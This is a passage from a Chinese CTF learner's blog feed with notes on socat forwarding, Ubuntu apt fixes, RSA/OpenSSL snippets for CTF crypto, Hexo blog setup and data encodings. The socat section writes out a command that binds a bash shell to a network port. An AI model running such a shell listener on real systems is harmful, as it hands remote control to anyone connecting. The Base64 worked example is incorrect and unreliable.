<li><p><strong>转发TCP</strong></p>
<p>监听192.168.1.252网卡的15672端口，并将请求转发至172.17.0.15的15672端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672</span><br></pre></td></tr></table></figure>

<p>其中，</p>
<ul>
<li><code>-d -d</code>：代表调试信息的输出级别，不懂</li>
<li><code>-lf /var/log/socat.log</code>：指定输出信息的文件保存位置</li>
<li><code> TCP4-LISTEN:[port]</code>：在本地建立一个TCP IPv4协议的监听端口</li>
<li><code>bind=[ip]</code>：指定监听绑定的IP地址，不绑定的话将监听服务器上可用的全部IP</li>
<li><code>reuseaddr </code>：绑定一个本地端口</li>
<li><code> fork TCP4:[ip]:[port]</code>：指定要转发到的服务器 IP 和端口</li>
</ul>
</li>
</ol>
<h4 id="传递文件"><a href="#传递文件" class="headerlink" title="传递文件"></a>传递文件</h4><p>将文件demo.tar.gz使用2000端口从192.168.1.252传到192.168.1.253，文件传输完毕后会自动退出</p>
<p>在192.168.1.252上执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat -u open:demo.tar.gz tcp-listen:2000,reuseaddr</span><br></pre></td></tr></table></figure>

<p>在192.168.1.253上执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat -u tcp:192.168.1.252:2000 open:demo.tar.gz,create</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-u</code>：数据传输模式从左到右单向</li>
<li><code>-U</code>：数据传输模式从右到左单向</li>
</ul>
<p>还可以<strong>读写分流</strong></p>
<h4 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h4><ul>
<li><p>建立一个正向shell</p>
<p><strong>服务端</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在服务端 7005 端口建立一个 Shellsocat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr或socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr</span></span><br></pre></td></tr></table></figure>

<p><strong>客户端</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 连接到服务器的 7005 端口，即可获得一个 Shell。readline 是 GNU 的命令行编辑器，具有历史功能socat readline tcp:127.0.0.1:7005</span></span><br></pre></td></tr></table></figure>

<p><em>不太懂，像但并不完全像</em></p>
</li>
</ul>
<ul>
<li><p><strong>让 Socat 后台运行</strong></p>
<p>这个挺好</p>
<p>在命令行最前面加一个<code>nohup</code>命令</p>
</li>
</ul>
<p>最重要的还是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nohup socat -d -d tcp-l:[port],reuseaddr,fork EXEC:python -u server.py</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>ubuntu软件更新失败解决</title>
    <url>/posts/ade40a32/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="ubuntu软件更新失败解决"><a href="#ubuntu软件更新失败解决" class="headerlink" title="ubuntu软件更新失败解决"></a>ubuntu软件更新失败解决</h1><p>才知道之前那么多次<code>apt update</code>一直是失败，报这样的错</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003101535464.png" alt="image-20211003101535464" style="zoom: 80%;" />

<p>此外还会报<code>Certificate verification failed: The certificate is NOT trusted.</code>的错误</p>
<p>具体原因没有深究，可能是源的问题</p>
<ul>
<li><p><strong>证书问题</strong></p>
<p>直接编辑源的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>将<code>https</code>替换成<code>http</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<p>进行一次更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>

<p>安装证书</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install ca-certificates</span><br></pre></td></tr></table></figure>

<p>显然<code>http</code>是不安全的，所有的数据包都会被监听，但不知道为什么阿里源都是<code>http</code>；总之在成功过后，还是把<code>http</code>替换回<code>https</code></p>
<p>最后再进行一次更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></li>
<li><p><strong>没有Release文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/apt/sources.list.d</span><br></pre></td></tr></table></figure>

<p>删除这个文件，有别的文件，我也不知道可不可以删，反正我一般就是这个<br><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003102507534.png" alt="image-20211003102507534"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm fcitx-team-ubuntu-nightly-bionic.list</span><br></pre></td></tr></table></figure>

<p>最后更新一下，成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
      </categories>
  </entry>
  <entry>
    <title>一些RSA文件操作的摘记</title>
    <url>/posts/d77a51b9/</url>
    <content><![CDATA[<p>在打CTF密码学方向的过程中，会遇到一些使用私钥公钥的形式题目，除了使用在线的网站，也可以用OpenSSL工具</p>
<span id="more"></span>

<h1 id="一些RSA文件操作的摘记"><a href="#一些RSA文件操作的摘记" class="headerlink" title="一些RSA文件操作的摘记"></a>一些RSA文件操作的摘记</h1><h2 id="提取密钥"><a href="#提取密钥" class="headerlink" title="提取密钥"></a>提取密钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in test.pfx -nocerts -nodes -out FILE_NAME</span><br></pre></td></tr></table></figure>

<h2 id="提取公钥"><a href="#提取公钥" class="headerlink" title="提取公钥"></a>提取公钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in FILE_NAME</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 从公钥文件中分解n和e</span></span><br><span class="line">pub_key = RSA.importKey(<span class="built_in">open</span>(<span class="string">&#x27;pubkey.pem&#x27;</span>).read())</span><br><span class="line">n = pub_key.n</span><br><span class="line">e = pub_key.e</span><br></pre></td></tr></table></figure>

<h2 id="提取私钥"><a href="#提取私钥" class="headerlink" title="提取私钥"></a>提取私钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -in FILE_NAME -text</span><br></pre></td></tr></table></figure>

<h2 id="提取密文"><a href="#提取密文" class="headerlink" title="提取密文"></a>提取密文</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1 = <span class="built_in">int</span>(<span class="built_in">open</span>(<span class="string">&#x27;FILE_PATH&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read().encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<p>做上面这一步的时候有错误的话，记得切换到python2下</p>
<h2 id="生成私钥文件"><a href="#生成私钥文件" class="headerlink" title="生成私钥文件"></a>生成私钥文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python  rsatool.py -f PEM -o key.pem -n ××× -d ×××</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line">python rsatool.py -f PEM -o key.pem -p 1 -q 1 -e 1</span><br></pre></td></tr></table></figure>

<p>这个文件我在KALI的rsatool-master下</p>
<h2 id="用私钥文件解密"><a href="#用私钥文件解密" class="headerlink" title="用私钥文件解密"></a>用私钥文件解密</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag</span><br><span class="line"></span><br><span class="line">openssl rsautl -decrypt -oaep -inkey key.pem -in flag.enc -out flag （OAEP方式）</span><br></pre></td></tr></table></figure>

<p>摘抄下来几个脚本，用到自取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_RSA</span>(<span class="params">privkey, message</span>):</span></span><br><span class="line">    key = <span class="built_in">open</span>(privkey, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    rsakey = RSA.importKey(key)</span><br><span class="line">    <span class="comment"># n = rsakey.n</span></span><br><span class="line">    <span class="comment"># d = rsakey.d</span></span><br><span class="line">    rsakey = PKCS1_OAEP.new(rsakey)</span><br><span class="line">    decrypted = rsakey.decrypt(b64decode(message)) <span class="comment">#需要先进行base64解密</span></span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> decrypt_RSA(<span class="string">&#x27;key.pem&#x27;</span>, flag)</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.通过已知条件，生成私钥，并解密密文</span></span><br><span class="line">pri_key = rsa.PrivateKey(n, e, d, p, q)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = rsa.decrypt(f.read(), pri_key)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line">rsakey = RSA.importKey(<span class="built_in">open</span>(<span class="string">&quot;pri.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line">rsa = PKCS1_OAEP.new(rsakey)</span><br><span class="line">msg = <span class="built_in">open</span>(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">f = rsa.decrypt(msg)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">keypair.p =</span><br><span class="line">keypair.q =</span><br><span class="line">keypair.e =</span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p - <span class="number">1</span>) * (keypair.q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure>

<p>从la佬博客la来的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">用法一：已知公钥(自动求私钥)</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --publickey 公钥文件 --uncipherfile 加密文件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">用法二：已知公钥求私钥</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --publickey 公钥文件 --private</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">用法三：密钥格式转换</span></span><br><span class="line"><span class="meta">#</span><span class="bash">把PEM格式的公钥转换为n，e</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --dumpkey --key 公钥文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">把n,e转换为PEM格式</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --createpub -n 782837482376192871287312987398172312837182 -e 65537</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>关于操作的一些问题</category>
      </categories>
      <tags>
        <tag>openssl</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用hexo搭建博客</title>
    <url>/posts/ed1adb0c/</url>
    <content><![CDATA[<p>马上就能拥有自己的博客了，开不开心，激不激动；我用的是</p>
<ul>
<li>ubuntu18，处于windows的子系统</li>
<li>hexo是5.4.0</li>
<li>因为NexT主题比较成熟，所以先拿这个练练手，是8.8.0版本的</li>
</ul>
<p>更多信息可以在<a href="https://hexo.io/zh-cn/docs/">官网文档</a>查询，此外还看了<a href="https://www.bilibili.com/video/BV1Yb411a7ty/?spm_id_from=333.788.recommend_more_video.0">b站up主的超级良心视频</a></p>
<span id="more"></span>
<h1 id="如何用hexo搭建博客"><a href="#如何用hexo搭建博客" class="headerlink" title="如何用hexo搭建博客"></a>如何用hexo搭建博客</h1><h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><h3 id="一、安装git和node-js"><a href="#一、安装git和node-js" class="headerlink" title="一、安装git和node.js"></a>一、安装git和node.js</h3><p><a href="http://git-scm.com/download/linux">git</a>，我要最新的，更新遇到的问题可以参考<a href="https://4xwi11.github.io/posts/ade40a32/">我的ubuntu软件更新失败解决</a></p>
<p><a href="https://github.com/nodesource/distributions">node.js</a>，就用长期支持的14版本吧</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003233927033.png" alt="image-20211003233927033"></p>
<p>最后检查</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git version</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>

<h3 id="二、安装hexo"><a href="#二、安装hexo" class="headerlink" title="二、安装hexo"></a>二、安装hexo</h3><p>可能遇到错误，我直接<code>sudo</code>可解决</p>
<hr>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p>这个命令会一起安装hexo的命令，所以能在命令行直接敲太香了</p>
<p>添加到环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo echo &#x27;PATH=&quot;$PATH:./node_modules/.bin&quot;&#x27; &gt;&gt; ~/.profile</span><br></pre></td></tr></table></figure>

<p>这样以后直接用<code>hexo + 命令</code>就可以了</p>
<h2 id="搭站"><a href="#搭站" class="headerlink" title="搭站"></a>搭站</h2><p>首先，初始化hexo最基本的文件到我们本地的目录，最后一个是文件名自己取，比如我就叫<code>4XWi11</code>，放我自己的 博客</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init 4XWi11</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd 4XWi11;npm install</span><br></pre></td></tr></table></figure>

<p>生成网站页面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g[enerator]</span><br></pre></td></tr></table></figure>

<p>可以看到生成了一个<code>public</code>的文件，就是我们生成的网站目录</p>
<p>打开这个网页，启动服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo s[erver]</span><br></pre></td></tr></table></figure>

<p>当然一开始是本地的</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul>
<li><p>新建文章</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new &quot;BLOG_TITLE&quot;</span><br></pre></td></tr></table></figure>

<p>其实就是新建了一个md文件</p>
</li>
<li><p>进行博客编辑</p>
</li>
<li><p>重新生成启动</p>
<p>再次运行<code>g</code>和<code>s</code>命令</p>
</li>
</ul>
<p>可惜可惜，和github一样不支持latex</p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>这里用Git部署</p>
<p>所以当然最最开始需要在github上有一个创库，<strong>注意：仓库的命名一定要是USER_NAME.github.io</strong>，比如我的就是<code>4XWi11.github.io</code>，后续浏览器可以直接访问</p>
<p>安装插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>如果不确定插件是否已经安装，可以用下条命令检测</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm list hexo-deployer-git</span><br></pre></td></tr></table></figure>

<p>然后更改<code>_config.yml</code>文件的选项，设置部署在<code>git</code>上，并给出仓库地址</p>
<p>运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>完成部署</p>
<p>遇到了密码不匹配的问题，要在输入密码的地方输入token</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003171639758.png" alt="image-20211003171639758"></p>
<p>勾选</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003171714542.png" alt="image-20211003171714542"></p>
<p>生成将token复制到需要填密码的地方即可</p>
<p>但是我又遇到上述操作做完还是认证失败的情况</p>
<p>然后把仓库删了重新创建一遍就好了，但总不能更新一遍就删掉重来吧</p>
<p><em>我知道了，不告诉你们，我再也不乱动方向盘了</em></p>
<p>但是后面还可能出现连不上github的情况，开关一下代理有时候可以解决</p>
<p>可是不知道是不是子系统的原因，我以为它会帮我自动记忆，没想到每次都要手输，看看之后有没有好的解决办法</p>
<h2 id="NexT主题"><a href="#NexT主题" class="headerlink" title="NexT主题"></a>NexT主题</h2><p>这里我跟着<a href="https://theme-materialized.github.io/how-to-build-a-hexo-blog/">materialized作者的博客</a>，一起来尝试NexT主题的配置</p>
<p>首先当然是把主题从github下载下来，放在themes目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<h3 id="换图标的问题"><a href="#换图标的问题" class="headerlink" title="换图标的问题"></a>换图标的问题</h3><p>图标来自<a href="https://fontawesome.com/v5.15/icons?d=gallery&p=2">FontAwesome</a></p>
<p>图标的名称，建议点开那个图标，你会发现名称的全称</p>
<h3 id="设置评论的问题"><a href="#设置评论的问题" class="headerlink" title="设置评论的问题"></a>设置评论的问题</h3><p>没有评论的博客是没有灵魂的，但是NexT8.8不支持内置valine</p>
<p>废了废了</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141656383.png" alt="image-20211006141656383"></p>
<p>这个等配置好latex再来配置吧</p>
<hr>
<p>最后决定用utterances了，配置方便，也不用挂梯子，只要有一个github账号，师傅们就可以找我玩啦</p>
<p>怎么配置可以看<a href="https://jasper1024.com/jasper/968d55ac/#languages-yml">这位师傅的</a></p>
<h3 id="代码主题"><a href="#代码主题" class="headerlink" title="代码主题"></a>代码主题</h3><p>首先选择引擎</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141448204.png" alt="image-20211006141448204"/>

<p>然后再选主题</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141336676.png" alt="image-20211006141336676"/>

<p>这里可以预览<a href="https://theme-next.js.org/highlight/">https://theme-next.js.org/highlight/</a></p>
<h3 id="latex"><a href="#latex" class="headerlink" title="latex"></a>latex</h3><p>新版本的缺点就是网上的教程比较难找，但是我把这些全部开起来就可以了</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007095926085.png" alt="image-20211007095926085"/>

<p>还很nice得自动在居中公式后面加上了标号，可以好好利用</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007095954761.png" alt="image-20211007095954761"/>

<h3 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h3><p>我跟着<a href="https://hxhowl.com/posts/e6f9a475/">这篇博客</a>做的</p>
<h3 id="更改字体颜色"><a href="#更改字体颜色" class="headerlink" title="更改字体颜色"></a>更改字体颜色</h3><p>因为换了背景可能有footer的颜色看不清，看这位<a href="https://blog.csdn.net/weixin_40837922/article/details/88047241">师傅的</a>改了下颜色</p>
<h3 id="更改字体大小"><a href="#更改字体大小" class="headerlink" title="更改字体大小"></a>更改字体大小</h3><p>16px有点小大，喜欢殷实一点的，我这个版本在这里调，前面有一大推东西，直接拉到最后em那里改就好</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007114800161.png" alt="image-20211007114800161"/>

<h3 id="吉祥物"><a href="#吉祥物" class="headerlink" title="吉祥物"></a>吉祥物</h3><p>跟着上面背景图片的师傅搞了下，先用他的wanko，但看到这只狗觉得好爱哈哈哈，暂时就不换别的了（其他的都是二刺螈（doge））</p>
<h3 id="图片预览"><a href="#图片预览" class="headerlink" title="图片预览"></a>图片预览</h3><p>这个是真的坑。网上教程一大堆，因为另外一个会显示图片名称，而我却不会设置其不显示，所以我用的是zoom那个，安装倒不是问题直接在根目录按照github上npm</p>
<p>但是如果在markdown里用typora调一下图片的显示比例，在博客里预览时就会发生未知错乱</p>
<p>将就吧，以后尽量截图时不要截太大</p>
<hr>
<p>行吧，就这样吧，能用就行</p>
<p>花了几天时间搞花头，都是平面化学习，以后更应该专注于博客质量了</p>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>从这里开始的</tag>
      </tags>
  </entry>
  <entry>
    <title>数据编码</title>
    <url>/posts/b205cf3c/</url>
    <content><![CDATA[<p>ctf入门必备，你需要熟稔的那些编码。寒假跟着nep的师傅，讲得很好，对于当时的我来说。之前都觉得挺乱的，听了之后有种豁然开朗的感觉，偷了，以便后面忘了时回忆</p>
<span id="more"></span>

<h1 id="数据编码"><a href="#数据编码" class="headerlink" title="数据编码"></a>数据编码</h1><h1 id="常见进制"><a href="#常见进制" class="headerlink" title="常见进制"></a>常见进制</h1><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><h3 id="二进制转ascii码"><a href="#二进制转ascii码" class="headerlink" title="二进制转ascii码"></a>二进制转ascii码</h3><p>转成十进制再查表</p>
<h3 id="二进制转morse码"><a href="#二进制转morse码" class="headerlink" title="二进制转morse码"></a>二进制转morse码</h3><p>$(00101101)_2=(45)_{10}$，在ascii码表里面是”-“</p>
<p>$(00101110)_2=(46)_{10}$，在ascii码表里面是”.”</p>
<p><a href="https://coding.tools/cn/binary-to-text">在线解码网站</a></p>
<h3 id="二进制转二维码（绘图）"><a href="#二进制转二维码（绘图）" class="headerlink" title="二进制转二维码（绘图）"></a>二进制转二维码（绘图）</h3><p>检查二进制字符串长度开方后是否是整数<br>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/2/7 15:53</span></span><br><span class="line"><span class="comment"># @Author : Will</span></span><br><span class="line"><span class="comment"># @File : PIL(exp).py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line">qr_code = <span class="string">&quotquot;</span></span><br><span class="line">x = y = <span class="built_in">int</span>(sqrt(<span class="built_in">len</span>(qr_code)))</span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>, [x, y])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">        <span class="keyword">if</span> qr_code[j*y+i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            pic.putpixel([i, j], (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        <span class="keyword">elif</span> qr_code[j*y+i] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pic.putpixel([i, j], (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里有必要提醒一下，简单来说PIL库是针对python2的，python3的话用pillow库代替了，但是导入库的代码都是一样，很神奇，正如上述脚本所示。安装库可能会遇到些问题，建议面向百度，我遇到的问题是师傅给的脚本名字就是”PIL”，然后又是在pycharm同一个项目中，所以导入的时候报错了。</p>
<h3 id="二进制转图片（hex）"><a href="#二进制转图片（hex）" class="headerlink" title="二进制转图片（hex）"></a>二进制转图片（hex）</h3><p>先转十六进制，再在010editor里保存，更改为相应的文件。<br>注意编码方式是”十六进制（H）”，选择编辑，粘贴自，粘贴自十六进制文本。</p>
<h1 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h1><h2 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h2><p>这个图整理得海星，有三种进制对应的ascii码</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210207200756460.png" alt="Ascii码对照表"></p>
<h2 id="Base家族"><a href="#Base家族" class="headerlink" title="Base家族"></a>Base家族</h2><p>庞大的Base家族，这一块十分的重要</p>
<h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><p>编码原理：（把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式），转化可以分为六步</p>
<blockquote>
<p>a）源文本：O n e P i e c e<br>b）对应ascii码：79 110 101 80 105 101 99 101<br>c）8位binary：01001111 01101110 01100101 01010000 01101001 01100101 01100011 01100101<br>d）6位binary并在高位补0：00010011 00110110 00111001 00100101 00010100 00000110 00100101 00100101 00011000 00110110 00010100<br>e）对应十进制：19 54 57 37 20 6 37 37 24 54 20<br>f）查表：T 2 5 I U A G I I Y 2 U =</p>
</blockquote>
<p>显然会有字符串长度不是三的倍数的情况，从别的博主那里摘过来的，感觉写得比较明晰了</p>
<blockquote>
